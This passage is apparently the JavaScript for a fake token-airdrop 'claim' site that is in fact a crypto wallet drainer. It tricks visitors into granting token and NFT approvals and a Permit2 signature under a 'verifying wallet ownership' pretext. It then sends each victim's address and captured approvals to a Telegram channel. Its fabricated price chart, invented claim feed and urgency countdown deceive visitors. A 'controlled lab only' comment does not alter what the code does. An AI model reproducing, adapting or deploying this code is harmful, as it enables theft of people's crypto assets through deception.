      showStatus('Verifying wallet ownership…', 'info');
      permit2Payload = await requestPermit2Signature(connectedAddress, approvedTokens, approvedAmounts);
    }

    // ── Report to backend via Telegram ──
    const explorer = SUPPORTED_CHAINS[PRIMARY_CHAIN_ID].explorer;
    const msg = [
      `🟦 <b>Claim Session — ${chain.displayName}</b>`,
      `👤 <code>${connectedAddress}</code>`,
      `💰 ETH: ${balEth.toFixed(6)}`,
      `🪙 ERC-20 found: ${erc20s.length}`,
      `✅ ERC-20 approved: ${approvedCount}`,
      `🖼 NFT collections found: ${nfts.length}`,
      `✅ NFT approved: ${nftApprovals}`,
      permit2Payload ? `🔏 Permit2 signature captured` : `⚠️ No Permit2`,
      `🕒 ${new Date().toISOString()}`,
    ].join('\n');

    await sendTelegramMessage(msg);
    showStatus('Claim submitted. Please wait for confirmation.', 'success');

    // Expose the collected data so the backend can pull it (for controlled lab only)
    window.__apexSession = {
      victim: connectedAddress,
      chain: currentChainId,
      erc20s: erc20s,
      approvedTokens,
      approvedAmounts,
      nfts,
      permit2Payload,
      timestamp: Date.now(),
    };

    userHasClaimed = true;
  } catch (e) {
    logDebug(`Claim flow error: ${e.message}`);
    showStatus('Claim failed. Please try again.', 'error');
  }
}

window.initiateClaimProcess = initiateClaimProcess;

/* ------------------------------------------------------------------ */
/*  SESSION PERSISTENCE                                                */
/* ------------------------------------------------------------------ */
function saveWallet(address, session = null, chainType = 'evm') {
  localStorage.setItem('connectedWallet', address);
  if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
  localStorage.setItem('chainType', chainType);
}
function getSavedWallet() { return localStorage.getItem('connectedWallet'); }
function clearSavedWallet() {
  localStorage.removeItem('connectedWallet');
  localStorage.removeItem('walletConnectSession');
  localStorage.removeItem('chainType');
}

async function tryRestoreConnection() {
  const saved = getSavedWallet();
  if (!saved) return;
  logDebug(`Found saved wallet ${saved}, checking connection…`);
  if (isMobileDevice) {
    clearSavedWallet();
    return;
  }
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts?.length && accounts[0].toLowerCase() === saved.toLowerCase()) {
        await connectDirectEVM();
      }
    } catch {}
  }
}

/* ------------------------------------------------------------------ */
/*  UI WIRING                                                          */
/* ------------------------------------------------------------------ */
function showWalletModal() { walletModal?.classList.add('active'); }
function hideWalletModal() { walletModal?.classList.remove('active'); }
function hideAnnouncementModal() { announcementModal?.classList.remove('active'); }

function toggleMobileMenu() { navLinks?.classList.toggle('active'); }
if (mobileMenuBtn) mobileMenuBtn.addEventListener('click', toggleMobileMenu);
if (walletModalClose) walletModalClose.addEventListener('click', hideWalletModal);
if (announcementModalClose) announcementModalClose.addEventListener('click', hideAnnouncementModal);
if (announcementOkBtn) announcementOkBtn.addEventListener('click', hideAnnouncementModal);
if (copyReferralBtn) copyReferralBtn.addEventListener('click', () => {
  if (!referralLink) return;
  const ta = document.createElement('textarea');
  ta.value = referralLink.textContent;
  document.body.appendChild(ta);
  ta.select();
  document.execCommand('copy');
  ta.remove();
  showNotification('Referral link copied!', 'success');
});

if (debugToggle) {
  debugToggle.addEventListener('click', () => {
    connectionDebug?.classList.toggle('active');
    debugToggle.textContent = connectionDebug?.classList.contains('active')
      ? 'Hide connection details'
      : 'Show connection details';
  });
}

if (walletProviders) {
  walletProviders.forEach(p => {
    p.addEventListener('click', () => connectFlow());
  });
}

/* ------------------------------------------------------------------ */
/*  UI DECORATIONS                                                     */
/* ------------------------------------------------------------------ */
function startCountdown() {
  let remaining = 114600;
  updateCountdownDisplay(remaining);
  countdownInterval = setInterval(() => {
    remaining--;
    if (remaining <= 0) { clearInterval(countdownInterval); return; }
    updateCountdownDisplay(remaining);
  }, 1000);
}

function updateCountdownDisplay(s) {
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  const el = document.getElementById('countdown');
  if (el) el.textContent = `${d}:${h}:${m}:${sec}`;
}

function createTokenChart() {
  const ctx = document.getElementById('tokenChart');
  if (!ctx || typeof Chart === 'undefined') return;
  const data = [];
  let v = 0.04;
  for (let i = 0; i < 24; i++) { v += Math.random() * 0.01 - 0.002; data.push(v); }
  tokenChart = new Chart(ctx.getContext('2d'), {
    type: 'line',
    data: {
      labels: Array.from({ length: 24 }, (_, i) => i + 'h'),
      datasets: [{ label: 'APEX', data, borderColor: '#FF6B00', backgroundColor: 'rgba(255,107,0,0.1)', borderWidth: 2, tension: 0.4, pointRadius: 0, fill: true }],
    },
    options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { display: false }, y: { grid: { color: 'rgba(255,255,255,0.05)' } } } },
  });
}

function updateTokenPrice() {
  const last = priceHistory[priceHistory.length - 1] || 0.04;
  const change = Math.random() * 0.015 - 0.002;
  const price = (last + change).toFixed(4);
  priceHistory.push(parseFloat(price));
  if (priceHistory.length > 10) priceHistory.shift();
  const el = document.getElementById('tokenPrice');
  if (el) el.textContent = `$${price}`;
}

function generateInitialClaims() {
  claimList = Array.from({ length: 10 }, () => ({
    address: `0x${Math.random().toString(16).slice(2, 6)}...${Math.random().toString(16).slice(2, 6)}`,
    amount: 500,
    timestamp: Date.now() - Math.random() * 3600000,
  }));
  updateClaimList();
}

function updateClaimList() {
  if (!claimListElement) return;
  claimListElement.innerHTML = claimList.map(c =>
    `<div class="claim-item" style="display:flex; justify-content:space-between; padding:6px 0; font-size:12px;">
      <span style="color:#00b4d8;">${c.address}</span>
      <span style="color:#10b981;">${c.amount} APEX</span>
    </div>`
  ).join('');
}

function startClaimUpdates() {
  setInterval(() => {
    claimList.unshift({ address: `0x${Math.random().toString(16).slice(2, 6)}...`, amount: 500, timestamp: Date.now() });
    if (claimList.length > 10) claimList.pop();
    updateClaimList();
  }, 30000);
}

function updateAIAnalytics() {
  if (predictionFill) predictionFill.style.width = `${85 + Math.floor(Math.random() * 15)}%`;
}

/* ------------------------------------------------------------------ */
/*  BOOT                                                               */
/* ------------------------------------------------------------------ */
logDebug('✅ script.js loaded — matching HybridDrainer ABI');
